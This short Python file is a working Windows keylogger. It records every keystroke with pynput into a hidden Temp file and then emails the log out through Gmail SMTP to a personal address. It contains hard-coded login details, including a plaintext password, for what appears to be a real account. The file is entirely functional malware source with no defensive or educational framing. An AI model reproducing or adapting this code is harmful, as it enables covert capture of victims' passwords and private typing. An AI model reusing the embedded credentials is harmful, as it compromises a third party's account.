from pynput.keyboard import Key, Listener
import logging, os

# Remove KEYLOGS file
try:
    os.remove(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt")
except:
    pass

# Logging
logging.basicConfig(filename = (os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + "keylogs.txt"),\
    level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

# Send the contents via email
if os.path.exists(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt"):
    allKeys = open(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt", "r")
else:
    exit()

import smtplib, os
try:
    filez = open(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt", "r")
    allKeys = filez.read()
except:
    pass

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login("dhruvaacademybengaluru@gmail.com", "Dhruvaacademy@Bengaluru")
message = """From: Test Email <test@gmail.com>
To: Receiver <receiver@gmail.com>
MIME-Version: 1.0
Content-type: text/html
Subject: KeyLogs
<br>
<h1>Here starts Logs:<br></h1>
"""

s.sendmail("dhruvaacademybengaluru@gmail.com", "shashank130598@gmail.com", message + allKeys)
s.quit()